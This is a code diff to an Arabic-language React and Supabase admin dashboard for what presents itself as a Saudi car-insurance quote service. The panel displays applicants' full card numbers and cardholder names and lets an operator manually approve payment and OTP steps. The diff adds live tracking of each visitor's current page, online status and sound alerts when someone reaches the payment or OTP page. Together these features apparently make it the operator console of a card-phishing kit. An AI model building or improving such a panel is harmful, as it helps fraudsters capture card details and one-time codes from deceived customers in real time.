@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { SidebarProvider, SidebarTrigger } from "@/components/ui/sidebar";
@@ -7,7 +7,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { CheckCircle, XCircle, Clock, Eye, Loader2 } from "lucide-react";
+import { CheckCircle, XCircle, Clock, Eye, Loader2, MapPin, RefreshCw } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import {
   Dialog,
@@ -16,11 +16,12 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { usePresence } from "@/hooks/usePresence";
+import { usePresence, OnlineUser } from "@/hooks/usePresence";
 
 interface Application {
   id: string;
   created_at: string;
+  updated_at: string;
   full_name: string;
   phone: string;
   insurance_type: string;
@@ -33,6 +34,7 @@ interface Application {
   vehicle_value: number;
   selected_company: string;
   selected_price: string;
+  regular_price: string;
   cardholder_name: string;
   card_number: string;
   card_last_4: string;
@@ -47,7 +49,22 @@ interface Application {
   payment_approved: boolean;
   otp_approved: boolean;
   status: string;
+  usage_purpose: string;
+  policy_start_date: string;
+  add_driver: boolean;
 }
+
+const getPageName = (step: string): string => {
+  const pages: { [key: string]: string } = {
+    'quote_form': '📝 صفحة النموذج الأول',
+    'vehicle_info': '🚗 صفحة معلومات المركبة',
+    'insurance_selection': '🏢 صفحة اختيار التأمين',
+    'payment': '💳 صفحة الدفع',
+    'otp': '🔐 صفحة التحقق OTP',
+    'completed': '✅ مكتمل',
+  };
+  return pages[step] || step || 'غير معروف';
+};
 
 const DashboardApplications = () => {
   const navigate = useNavigate();
@@ -56,8 +73,10 @@ const DashboardApplications = () => {
   const [relatedApplications, setRelatedApplications] = useState<Application[]>([]);
   const [showDetails, setShowDetails] = useState(false);
   const [loading, setLoading] = useState(true);
+  const [refreshing, setRefreshing] = useState(false);
   const { toast } = useToast();
   const { onlineUsers } = usePresence();
+  const previousStepsRef = useRef<Map<string, string>>(new Map());
 
   useEffect(() => {
     const checkAuth = async () => {
@@ -87,9 +106,23 @@ const DashboardApplications = () => {
           
           if (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT') {
             const newData = payload.new as any;
+            const previousStep = previousStepsRef.current.get(newData.id);
+            
+            // تنبيه عند تغيير الصفحة
+            if (previousStep && previousStep !== newData.current_step) {
+              playPageChangeSound();
+              toast({
+                title: "📍 العميل انتقل لصفحة جديدة",
+                description: `${newData.full_name || 'عميل'} انتقل إلى ${getPageName(newData.current_step)}`,
+                duration: 5000,
+              });
+            }
+            
+            // تحديث الخطوة السابقة
+            previousStepsRef.current.set(newData.id, newData.current_step);
             
             // تنبيه خاص بالصفحة الأولى (النموذج الأول)
-            if (newData.current_step === 'quote_form' && newData.status === 'pending') {
+            if (newData.current_step === 'quote_form' && payload.eventType === 'INSERT') {
               playQuoteFormSound();
               toast({
                 title: "📋 عميل جديد بدأ التسجيل!",
@@ -123,6 +156,25 @@ const DashboardApplications = () => {
       supabase.removeChannel(channel);
     };
   }, [navigate]);
+
+  // صوت تنبيه عند تغيير الصفحة
+  const playPageChangeSound = () => {
+    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+    const oscillator = audioContext.createOscillator();
+    const gainNode = audioContext.createGain();
+    
+    oscillator.connect(gainNode);
+    gainNode.connect(audioContext.destination);
+    
+    oscillator.frequency.value = 440;
+    oscillator.type = 'sine';
+    
+    gainNode.gain.setValueAtTime(0.15, audioContext.currentTime);
+    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+    
+    oscillator.start(audioContext.currentTime);
+    oscillator.stop(audioContext.currentTime + 0.3);
+  };
 
   // صوت تنبيه لصفحة النموذج الأولى (صوت ناعم ومختلف)
   const playQuoteFormSound = () => {
@@ -205,17 +257,27 @@ const DashboardApplications = () => {
   };
 
   const fetchApplications = async () => {
+    setRefreshing(true);
     const { data, error } = await supabase
       .from('customer_applications')
       .select('*')
-      .order('created_at', { ascending: false });
+      .order('updated_at', { ascending: false });
 
     if (error) {
       console.error('Error fetching applications:', error);
+      setRefreshing(false);
       return;
     }
 
+    // تحديث الخطوات السابقة للتتبع
+    data?.forEach(app => {
+      if (!previousStepsRef.current.has(app.id)) {
+        previousStepsRef.current.set(app.id, app.current_step);
+      }
+    });
+
     setApplications(data || []);
+    setRefreshing(false);
   };
 
   const approveStep = async (appId: string, stepField: string) => {
@@ -315,93 +377,165 @@ const DashboardApplications = () => {
 
           <main className="flex-1 p-6 bg-muted/30">
             <div className="max-w-7xl mx-auto space-y-6">
-              <div>
-                <h2 className="text-3xl font-bold mb-2">إدارة طلبات العملاء</h2>
-                <p className="text-muted-foreground">
-                  إجمالي {applications.length} طلب
-                </p>
+              <div className="flex items-center justify-between">
+                <div>
+                  <h2 className="text-3xl font-bold mb-2">إدارة طلبات العملاء</h2>
+                  <p className="text-muted-foreground">
+                    إجمالي {applications.length} طلب | متصل الآن: {onlineUsers.size}
+                  </p>
+                </div>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={fetchApplications}
+                  disabled={refreshing}
+                  className="gap-2"
+                >
+                  <RefreshCw className={`h-4 w-4 ${refreshing ? 'animate-spin' : ''}`} />
+                  تحديث
+                </Button>
               </div>
 
               <div className="grid gap-4">
-                {applications.map((app) => (
-          <Card key={app.id} className="p-4 md:p-6">
-            <div className="space-y-4">
-              <div className="space-y-2">
-                <div className="flex items-center gap-2">
-                  <h3 className="text-xl font-bold">{app.full_name}</h3>
-                  {onlineUsers.has(app.id) && (
-                    <div className="relative">
-                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
-                      <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
-                    </div>
-                  )}
-                </div>
-                <p className="text-sm text-muted-foreground">📱 {app.phone}</p>
-                {app.id_number && (
-                  <p className="text-sm">🆔 رقم الهوية/الإقامة: {app.id_number}</p>
-                )}
-                {app.serial_number && (
-                  <p className="text-sm">🔢 الرقم التسلسلي: {app.serial_number}</p>
-                )}
-                <p className="text-sm">🚗 {app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</p>
-                {app.vehicle_value && (
-                  <p className="text-sm">💰 قيمة السيارة: {app.vehicle_value.toLocaleString('ar-SA')} ر.س</p>
-                )}
-                {app.selected_company && (
-                  <p className="text-sm">🏢 {app.selected_company} - {app.selected_price} ر.س</p>
-                )}
-                {app.created_at && (
-                  <p className="text-sm text-muted-foreground">
-                    📅 {new Date(app.created_at).toLocaleDateString('ar-EG', {
-                      year: 'numeric',
-                      month: 'short',
-                      day: 'numeric',
-                      calendar: 'gregory'
-                    })}
-                    {' | '}
-                    <span dir="ltr">
-                      🕐 {new Date(app.created_at).toLocaleTimeString('ar-EG', {
-                        hour: '2-digit',
-                        minute: '2-digit'
-                      })}
-                    </span>
-                  </p>
-                )}
-              </div>
+                {applications.map((app) => {
+                  const userOnline = onlineUsers.get(app.id);
+                  const isOnline = !!userOnline;
+                  
+                  return (
+                    <Card key={app.id} className={`p-4 md:p-6 transition-all ${isOnline ? 'ring-2 ring-green-500 shadow-lg' : ''}`}>
+                      <div className="space-y-4">
+                        {/* معلومات العميل الأساسية */}
+                        <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-4">
+                          <div className="space-y-2 flex-1">
+                            <div className="flex items-center gap-3 flex-wrap">
+                              <h3 className="text-xl font-bold">{app.full_name || 'بدون اسم'}</h3>
+                              {isOnline && (
+                                <div className="flex items-center gap-2 bg-green-100 dark:bg-green-900/30 px-3 py-1 rounded-full">
+                                  <div className="relative">
+                                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+                                    <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
+                                  </div>
+                                  <span className="text-xs font-semibold text-green-700 dark:text-green-300">متصل الآن</span>
+                                </div>
+                              )}
+                            </div>
+                            
+                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2 text-sm">
+                              <p className="flex items-center gap-1">
+                                <span className="text-muted-foreground">📱 الهاتف:</span>
+                                <span className="font-semibold" dir="ltr">{app.phone || 'غير متوفر'}</span>
+                              </p>
+                              {app.serial_number && (
+                                <p className="flex items-center gap-1">
+                                  <span className="text-muted-foreground">🔢 التسلسلي:</span>
+                                  <span className="font-semibold">{app.serial_number}</span>
+                                </p>
+                              )}
+                              {app.insurance_type && (
+                                <p className="flex items-center gap-1">
+                                  <span className="text-muted-foreground">📋 التأمين:</span>
+                                  <span className="font-semibold">{app.insurance_type === 'comprehensive' ? 'شامل' : 'ضد الغير'}</span>
+                                </p>
+                              )}
+                              {app.vehicle_manufacturer && (
+                                <p className="flex items-center gap-1">
+                                  <span className="text-muted-foreground">🚗 المركبة:</span>
+                                  <span className="font-semibold">{app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</span>
+                                </p>
+                              )}
+                              {app.vehicle_value && (
+                                <p className="flex items-center gap-1">
+                                  <span className="text-muted-foreground">💰 القيمة:</span>
+                                  <span className="font-semibold">{app.vehicle_value.toLocaleString('ar-SA')} ر.س</span>
+                                </p>
+                              )}
+                              {app.selected_company && (
+                                <p className="flex items-center gap-1">
+                                  <span className="text-muted-foreground">🏢 الشركة:</span>
+                                  <span className="font-semibold">{app.selected_company} - {app.selected_price} ر.س</span>
+                                </p>
+                              )}
+                            </div>
+                            
+                            <p className="text-xs text-muted-foreground">
+                              📅 {new Date(app.created_at).toLocaleDateString('ar-EG', {
+                                year: 'numeric',
+                                month: 'short',
+                                day: 'numeric',
+                              })}
+                              {' | '}
+                              <span dir="ltr">
+                                🕐 {new Date(app.created_at).toLocaleTimeString('ar-EG', {
+                                  hour: '2-digit',
+                                  minute: '2-digit'
+                                })}
+                              </span>
+                              {app.updated_at && app.updated_at !== app.created_at && (
+                                <>
+                                  {' | '}
+                                  آخر تحديث: {new Date(app.updated_at).toLocaleTimeString('ar-EG', {
+                                    hour: '2-digit',
+                                    minute: '2-digit'
+                                  })}
+                                </>
+                              )}
+                            </p>
+                          </div>
+                          
+                          {/* الصفحة الحالية */}
+                          <div className="flex flex-col items-start md:items-end gap-2">
+                            <div className={`px-4 py-2 rounded-lg border-2 ${
+                              isOnline 
+                                ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700' 
+                                : 'bg-muted border-muted-foreground/20'
+                            }`}>
+                              <div className="flex items-center gap-2">
+                                <MapPin className={`w-4 h-4 ${isOnline ? 'text-green-600' : 'text-muted-foreground'}`} />
+                                <span className="text-xs text-muted-foreground">الصفحة الحالية:</span>
+                              </div>
+                              <p className={`font-bold text-sm mt-1 ${isOnline ? 'text-green-700 dark:text-green-300' : ''}`}>
+                                {getPageName(app.current_step)}
+                              </p>
+                            </div>
+                            
+                            <Button
+                              onClick={() => {
+                                setSelectedApp(app);
+                                fetchRelatedApplications(app.phone);
+                                setShowDetails(true);
+                              }}
+                              variant="default"
+                              size="sm"
+                              className="gap-2"
+                            >
+                              <Eye className="w-4 h-4" />
+                              عرض التفاصيل
+                            </Button>
+                          </div>
+                        </div>
 
-              <Button
-                onClick={() => {
-                  setSelectedApp(app);
-                  fetchRelatedApplications(app.phone);
-                  setShowDetails(true);
-                }}
-                variant="default"
-                className="w-full md:w-auto gap-2"
-              >
-                <Eye className="w-4 h-4" />
-                عرض التفاصيل
-              </Button>
-            </div>
-
-            <div className="mt-4 pt-4 border-t">
-              <div className="flex gap-3 items-center">
-                <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
-                  الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
-                </Badge>
-                {app.current_step === 'payment' && !app.payment_approved && (
-                  <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950">
-                    في انتظار موافقة الدفع 💳
-                  </Badge>
-                )}
-                {app.current_step === 'otp' && !app.otp_approved && (
-                  <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950">
-                    في انتظار موافقة OTP 🔐
-                  </Badge>
-                )}
-              </div>
-            </div>
-          </Card>
-                ))}
+                        {/* شريط الحالة */}
+                        <div className="pt-4 border-t">
+                          <div className="flex flex-wrap gap-2 items-center">
+                            <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
+                              الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
+                            </Badge>
+                            {app.current_step === 'payment' && !app.payment_approved && (
+                              <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950 animate-pulse">
+                                في انتظار موافقة الدفع 💳
+                              </Badge>
+                            )}
+                            {app.current_step === 'otp' && !app.otp_approved && (
+                              <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950 animate-pulse">
+                                في انتظار موافقة OTP 🔐
+                              </Badge>
+                            )}
+                          </div>
+                        </div>
+                      </div>
+                    </Card>
+                  );
+                })}
               </div>
 
               {/* Dialog لعرض التفاصيل الكاملة */}
@@ -416,27 +550,44 @@ const DashboardApplications = () => {
 
           {selectedApp && (
             <div className="space-y-6">
-              {/* معلومات العميل */}
-              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
-                <div className="flex items-center justify-between mb-3">
-                  <h3 className="font-bold text-lg">👤 معلومات العميل</h3>
+              {/* الصفحة الحالية للعميل */}
+              <div className={`p-4 rounded-lg border-2 ${
+                onlineUsers.has(selectedApp.id)
+                  ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700'
+                  : 'bg-muted border-muted-foreground/20'
+              }`}>
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <MapPin className={`w-5 h-5 ${onlineUsers.has(selectedApp.id) ? 'text-green-600' : 'text-muted-foreground'}`} />
+                    <div>
+                      <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
+                      <p className={`text-lg font-bold ${onlineUsers.has(selectedApp.id) ? 'text-green-700 dark:text-green-300' : ''}`}>
+                        {getPageName(selectedApp.current_step)}
+                      </p>
+                    </div>
+                  </div>
                   <div className="flex items-center gap-2">
                     {onlineUsers.has(selectedApp.id) ? (
                       <>
                         <div className="relative">
-                          <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
-                          <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
+                          <div className="w-4 h-4 bg-green-500 rounded-full animate-pulse"></div>
+                          <div className="absolute inset-0 w-4 h-4 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                         </div>
-                        <span className="text-sm font-semibold text-green-600">متصل الآن</span>
+                        <span className="text-sm font-bold text-green-600">متصل الآن</span>
                       </>
                     ) : (
                       <>
-                        <div className="w-3 h-3 bg-gray-400 rounded-full"></div>
+                        <div className="w-4 h-4 bg-gray-400 rounded-full"></div>
                         <span className="text-sm font-semibold text-gray-600">غير متصل</span>
                       </>
                     )}
                   </div>
                 </div>
+              </div>
+
+              {/* معلومات العميل */}
+              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
+                <h3 className="font-bold text-lg mb-3">👤 معلومات العميل</h3>
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                   <div>
                     <p className="text-xs text-muted-foreground mb-1">الاسم الكامل:</p>
